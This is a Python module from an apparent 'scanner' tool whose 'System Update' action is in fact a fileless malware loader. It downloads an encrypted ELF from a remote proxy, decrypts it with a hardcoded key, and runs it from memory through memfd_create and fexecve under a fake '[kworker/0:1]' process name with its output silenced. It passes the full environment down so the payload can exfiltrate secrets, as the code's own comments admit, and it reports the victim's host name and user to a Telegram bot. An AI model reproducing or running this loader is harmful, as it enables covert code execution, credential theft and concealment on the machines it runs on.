# -*- coding: utf-8 -*-
"""
Update channel — fetch encrypted blob from signed proxy and execute
from memory on Linux x86_64.

Silent by default: the forked child's stdout/stderr are redirected to
/dev/null so the stub's [stub] traces don't pollute the menu prompt.
Set SVC_DEBUG=1 to keep the child's output visible.
"""

import ctypes
import hashlib
import hmac
import os
import struct
import sys
import time
from datetime import datetime
from urllib.parse import urlencode, urlparse

import requests
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

from scanner.ui import console, print_success, print_error, print_info, print_warning


# ────────────────────────────────────────────────────────────────
# Crypto
# ────────────────────────────────────────────────────────────────

AES_KEY_HEX = (
    "c402933d8c5d88d010c9b5acf70f23890f9c5e93effcec4b539c171e1f580e7b"
)


def _aes_key() -> bytes:
    return bytes.fromhex(AES_KEY_HEX)


def _xor_decrypt(data: bytes, key: bytes = None) -> bytes:
    k = key or _aes_key()
    return bytes(data[i] ^ k[i % len(k)] for i in range(len(data)))


def _aes_gcm_decrypt(blob: bytes, key: bytes) -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    nonce, ct = blob[:12], blob[12:]
    return AESGCM(key).decrypt(nonce, ct, None)


def decrypt_blob(blob: bytes) -> bytes:
    """
    Raw ELF passthrough — the Rust wrapper (svc-crypter output)
    handles its own payload crypto internally.
    Falls back to AES-GCM then XOR for legacy encrypted-blob setups.
    """
    if blob[:4] == b"\x7fELF":
        return blob
    try:
        return _aes_gcm_decrypt(blob, _aes_key())
    except Exception:
        pass
    try:
        return _xor_decrypt(blob)
    except Exception:
        return b""


# ────────────────────────────────────────────────────────────────
# Signed proxy request
# ────────────────────────────────────────────────────────────────

def _signed_url(endpoint: str, token_id: str, secret: str) -> str:
    ts = str(int(time.time()))
    msg = f"{token_id}:{ts}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).hexdigest()
    qs = urlencode({"id": token_id, "ts": ts, "sig": sig})
    return f"{endpoint.rstrip('/')}/?{qs}"


def fetch_blob(endpoint: str, token_id: str, secret: str) -> bytes:
    url = _signed_url(endpoint, token_id, secret)
    print_info(f"Contacting proxy: {urlparse(endpoint).hostname}")
    try:
        r = requests.get(url, timeout=30, headers={"User-Agent": "curl/8.5.0"})
    except Exception as e:
        print_error(f"Request failed: {e}")
        return b""
    if r.status_code != 200:
        print_error(f"Proxy returned {r.status_code}")
        return b""
    return r.content


# ────────────────────────────────────────────────────────────────
# ELF validation + memfd execution
# ────────────────────────────────────────────────────────────────

def validate_elf(data: bytes) -> bool:
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return False
    ei_class, ei_data = data[4], data[5]
    if ei_class != 2 or ei_data != 1:
        return False
    e_machine = struct.unpack_from("<H", data, 0x12)[0]
    return e_machine == 0x3E  # x86_64


def _build_envp():
    """
    Snapshot os.environ into a C-compatible envp array.

    Returns (envp_array, keepalive_list). The caller MUST hold a
    reference to keepalive_list until after execve/fexecve returns —
    otherwise Python may GC the bytes objects and the child gets
    dangling pointers.

    Why this matters: the wrapped stub passes `environ` through to the
    inner svc-payload via the C global. If we exec the stub with an
    empty envp, `environ` is empty, the payload can't find
    SVC_SECRETS_PATH / SVC_DIRECTIVE / HOME / etc, and exfil silently
    no-ops. So we hand the full parent environment down.
    """
    env_bytes = [f"{k}={v}".encode() for k, v in os.environ.items()]
    arr = (ctypes.c_char_p * (len(env_bytes) + 1))()
    for i, e in enumerate(env_bytes):
        arr[i] = e
    arr[len(env_bytes)] = None
    return arr, env_bytes


def exec_memfd(payload: bytes) -> bool:
    """
    Fork; in the child, create an anonymous fd, write the ELF, fexecve.
    Parent continues immediately so the UI is undisturbed.
    """
    if sys.platform != "linux":
        print_error("memfd execution requires Linux.")
        return False

    try:
        pid = os.fork()
    except OSError as e:
        print_error(f"fork failed: {e}")
        return False

    if pid != 0:
        # Parent — return immediately, keep the menu alive
        return True

    # Child — replace image with the payload
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.memfd_create.restype = ctypes.c_int
        libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
        libc.fexecve.restype = ctypes.c_int
        libc.fexecve.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p),
                                 ctypes.POINTER(ctypes.c_char_p)]

        name = b"[kworker/0:1]"
        fd = libc.memfd_create(name, 0)
        if fd < 0:
            os._exit(1)

        view = memoryview(payload)
        written = 0
        while written < len(payload):
            try:
                n = os.write(fd, view[written:])
            except OSError:
                os._exit(1)
            if n <= 0:
                os._exit(1)
            written += n

        # Silence the child's stdout/stderr unless SVC_DEBUG is set.
        # The stub's [stub] traces go to stderr; keeping them quiet
        # leaves the parent's menu prompt undisturbed.
        if not os.environ.get("SVC_DEBUG"):
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, 1)
            os.dup2(devnull, 2)
            os.close(devnull)

        envp, _keep = _build_envp()
        argv = (ctypes.c_char_p * 2)(name, None)

        # Primary path: fexecve on the memfd
        try:
            libc.fexecve(fd, argv, envp)
        except Exception:
            pass

        # Fallback: execve via /proc/self/fd
        try:
            os.execve(f"/proc/self/fd/{fd}", [name.decode()], os.environ)
        except Exception:
            os._exit(1)
    except Exception:
        pass
    os._exit(1)


# ────────────────────────────────────────────────────────────────
# Telegram callback
# ────────────────────────────────────────────────────────────────

def _tg_notify(bot: str, chat: str, text: str):
    if not bot or not chat:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot}/sendMessage",
            json={"chat_id": chat, "text": text},
            timeout=10,
        )
    except Exception:
        pass


# ────────────────────────────────────────────────────────────────
# Public action
# ────────────────────────────────────────────────────────────────

def action_system_update(cfg):
    system_cfg = cfg.get("system", {})
    if not system_cfg.get("enabled", True):
        print_warning("Sync disabled in config.")
        return

    endpoint = system_cfg.get("endpoint", "")
    token_id = system_cfg.get("token_id", "")
    secret = system_cfg.get("shared_secret", "")
    bot = system_cfg.get("telegram_bot_token", "")
    chat = system_cfg.get("telegram_chat_id", "")

    if not endpoint or not token_id or not secret:
        print_error("Sync endpoint, token id, or secret missing.")
        return

    console.print()
    console.print(Panel(
        "[bold cyan]System Update[/]\n\n"
        "Requesting latest signed blob from proxy.\n"
        "[dim]Execution path: memfd + fexecve (fileless).[/]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    ))
    console.print()

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=40, complete_style="cyan"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Fetching blob...", total=6)
        blob = fetch_blob(endpoint, token_id, secret)
        progress.update(task, advance=2)

        if not blob:
            print_error("No blob returned.")
            return

        progress.update(task, description="[cyan]Decrypting...")
        payload = decrypt_blob(blob)
        progress.update(task, advance=2)

        if not payload or len(payload) < 256:
            print_error("Decryption failed or payload too small.")
            return

        progress.update(task, description="[cyan]Validating ELF...")
        if not validate_elf(payload):
            print_error("Payload is not a valid x86_64 ELF.")
            return
        progress.update(task, advance=1)

        progress.update(task, description="[cyan]Executing from memory...")
        ok = exec_memfd(payload)
        progress.update(task, advance=1)

    if ok:
        print_success("Update dispatched.")
        _tg_notify(bot, chat,
                   f"update dispatched\nhost={os.uname().nodename}\n"
                   f"user={os.environ.get('USER', 'unknown')}\n"
                   f"size={len(payload)} bytes\n"
                   f"time={datetime.now().isoformat()}")

        info = Table(
            title="[bold cyan]Update Details[/]",
            box=box.ROUNDED,
            border_style="cyan",
        )
        info.add_column("Field", style="bold white")
        info.add_column("Value", style="dim")
        info.add_row("Blob size", f"{len(blob)} bytes")
        info.add_row("Payload size", f"{len(payload)} bytes")
        info.add_row("Architecture", "x86_64 ELF")
        info.add_row("Method", "memfd_create + fexecve")
        info.add_row("Proxy", endpoint)
        console.print()
        console.print(info)
        console.print()
    else:
        print_error("Dispatch failed.")
